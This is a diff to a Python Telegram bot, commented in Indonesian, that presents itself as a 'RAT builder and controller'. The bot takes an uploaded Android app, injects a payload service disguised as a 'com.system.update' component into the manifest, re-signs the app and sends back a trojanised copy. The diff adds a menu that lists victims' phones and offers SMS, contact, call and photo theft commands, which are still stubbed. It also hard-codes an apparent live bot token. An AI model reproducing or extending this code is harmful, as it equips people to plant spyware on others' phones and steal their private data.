@@ -7,6 +7,7 @@ import xml.etree.ElementTree as ET
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
+# ── KONFIGURASI ──
 TOKEN = "9153767226:AAG9WkQcikOjpFiwWKpQ8GkRC92xOUO92sc" 
 ALLOWED_CHAT_ID = 8598136412 
 
@@ -17,7 +18,9 @@ KEY_ALIAS = "debugkey"
 PAYLOAD_SMALI_DIR = f"{WORK_DIR}/payload_smali/com/system/update"
 
 os.makedirs(WORK_DIR, exist_ok=True)
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logging.disable(logging.CRITICAL) # Biar layar Termux bersih
+
+user_states = {} # Nyimpen status (lagi nunggu APK atau lagi di menu)
 
 def is_authorized(update: Update):
     return update.effective_chat.id == ALLOWED_CHAT_ID
@@ -38,6 +41,89 @@ def inject_manifest(manifest_path):
             ET.SubElement(app, 'service', {ns + 'name': '.Payload', ns + 'enabled': 'true', ns + 'exported': 'false'})
     tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
 
+# ── TAMPILAN START (2 PILIHAN) ──
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update): return
+    
+    # Kalau dari command /start atau dari tombol back
+    chat_id = update.effective_chat.id
+    user_states.pop(chat_id, None) # Reset state
+
+    banner = (
+        "```\n"
+        "███╗   ███╗██████╗ ██╗  ██╗ ██╗ ██╗  ███╗  ███╗       ██╗██████╗ \n"
+        "████╗ ████║██╔══██╗██║  ██║ ██║ ██║ ██╔██╗ ██╔██╗      ██║██╔══██╗\n"
+        "██╔████╔██║██████╔╝███████║ ███████║██╔╝██╗██╔╝██╗     ██║██║  ██║\n"
+        "██║╚██╔╝██║██╔══██╗╚════██║ ╚════██║██████╔╝██████╔╝   ██║██║  ██║\n"
+        "██║ ╚═╝ ██║██║  ██║      ██║      ██║╚═██╔═╝╚═██╔═╝    ██║██████╔╝\n"
+        "╚═╝     ╚═╝╚═╝  ╚═╝      ╚═╝      ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═════╝ \n"
+        "```\n"
+        "✨ **RAT BUILDER & CONTROLLER** ✨\n"
+        "Status: 🟢 Online\n\n"
+        "Silakan pilih menu:"
+    )
+    
+    keyboard = [
+        [InlineKeyboardButton("📦 Build APK Baru", callback_data="menu_build")],
+        [InlineKeyboardButton("📱 List Device Ter-Sadap", callback_data="menu_device")]
+    ]
+    
+    if update.callback_query:
+        await update.callback_query.edit_message_text(banner, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    else:
+        await update.message.reply_text(banner, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+
+# ── HANDLER TOMBOL ──
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    if not is_authorized(update): return
+    
+    chat_id = update.effective_chat.id
+
+    if query.data == "menu_build":
+        user_states[chat_id] = "waiting_apk"
+        await query.edit_message_text(
+            "📦 **Build APK Baru**\n\n"
+            "Silakan kirim file `.apk` asli yang mau disusupi RAT sekarang.",
+            parse_mode='Markdown'
+        )
+
+    elif query.data == "menu_device":
+        # (Nanti ini bisa narik dari database SQLite)
+        keyboard = [
+            [InlineKeyboardButton("📱 HP Korban 1", callback_data="device_1")],
+            [InlineKeyboardButton("📱 HP Korban 2", callback_data="device_2")],
+            [InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")]
+        ]
+        await query.edit_message_text(
+            "📱 **List Device Ter-Sadap**\n\n"
+            "Pilih device untuk melihat menu kontrol:",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+
+    elif query.data == "back_start":
+        await start(update, context)
+        
+    elif query.data in ["device_1", "device_2"]:
+        # Ini menu kontrol RAT (sama kayak yang kita bikin di awal)
+        keyboard = [
+            [InlineKeyboardButton("📩 SMS", callback_data="cmd_sms"), InlineKeyboardButton("👥 Kontak", callback_data="cmd_kontak")],
+            [InlineKeyboardButton("📞 Telpon", callback_data="cmd_telpon"), InlineKeyboardButton("📸 Foto", callback_data="cmd_foto")],
+            [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]
+        ]
+        await query.edit_message_text(
+            "🎮 **Menu Kontrol Device**\nPilih aksi:",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+
+    elif query.data.startswith("cmd_"):
+        # Simulasi kirim perintah ke APK korban
+        await query.edit_message_text("⏳ Mengirim perintah ke HP korban...\n*(Fitur ini nyambung ke APK RAT)*")
+
+# ── PROSES BUILD APK ──
 async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, file_name: str):
     await update.message.reply_text(f"⏳ Menerima APK: `{file_name}`\nSedang memproses inject otomatis...", parse_mode='Markdown')
     session_id = str(uuid.uuid4())[:8]
@@ -74,6 +160,9 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
         with open(signed_apk, "rb") as f:
             await context.bot.send_document(chat_id=ALLOWED_CHAT_ID, document=f, filename=f"MOD_{file_name}")
             
+        # Balikin ke menu awal
+        await start(update, context)
+            
     except subprocess.CalledProcessError as e:
         error_msg = e.stderr.decode('utf-8') if e.stderr else str(e)
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=f"❌ **GAGAL BUILD:**\n```\n{error_msg[:1000]}\n```", parse_mode='Markdown')
@@ -82,41 +171,36 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
     finally:
         if os.path.exists(file_path): os.remove(file_path)
         if os.path.exists(session_dir): shutil.rmtree(session_dir)
+        user_states.pop(ALLOWED_CHAT_ID, None)
 
+# ── HANDLER NERIMA FILE ──
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_authorized(update): return
-    doc = update.message.document
-    if not doc.file_name.endswith(".apk"):
-        await update.message.reply_text("❌ File harus `.apk`")
+    
+    # Cuma nerima APK kalau user lagi di menu "Build APK Baru"
+    if user_states.get(ALLOWED_CHAT_ID) != "waiting_apk":
+        await update.message.reply_text("❌ Klik menu **Build APK Baru** dulu sebelum mengirim file.")
         return
+
+    doc = update.message.document
+    if not doc or not doc.file_name.lower().endswith(".apk"):
+        await update.message.reply_text("❌ File harus berekstensi `.apk`")
+        return 
+
     await update.message.reply_text("⏳ Mendownload APK...")
     file = await context.bot.get_file(doc.file_id)
     temp_apk_path = f"{WORK_DIR}/{doc.file_name}"
     await file.download_to_drive(temp_apk_path)
+    
     await process_apk(update, context, temp_apk_path, doc.file_name)
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_authorized(update): return
-    banner = (
-        "```\n"
-        "███╗   ███╗██████╗ ██╗  ██╗ ██╗ ██╗  ███╗  ███╗       ██╗██████╗ \n"
-        "████╗ ████║██╔══██╗██║  ██║ ██║ ██║ ██╔██╗ ██╔██╗      ██║██╔══██╗\n"
-        "██╔████╔██║██████╔╝███████║ ███████║██╔╝██╗██╔╝██╗     ██║██║  ██║\n"
-        "██║╚██╔╝██║██╔══██╗╚════██║ ╚════██║██████╔╝██████╔╝   ██║██║  ██║\n"
-        "██║ ╚═╝ ██║██║  ██║      ██║      ██║╚═██╔═╝╚═██╔═╝    ██║██████╔╝\n"
-        "╚═╝     ╚═╝╚═╝  ╚═╝      ╚═╝      ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═════╝ \n"
-        "```\n"
-        "✨ **RAT BUILDER SERVER** ✨\n"
-        "Status: 🟢 Online (Termux Mode)\n\n"
-        "Silakan kirim file `.apk` asli yang mau disusupi RAT."
-    )
-    await update.message.reply_text(banner, parse_mode='Markdown')
 
 def main():
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.Document.APK, handle_document))
-    print("🤖 Bot Builder nyala...")
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    
+    print("🤖 Bot Builder & Controller nyala...")
     app.run_polling()
 
 if __name__ == '__main__':
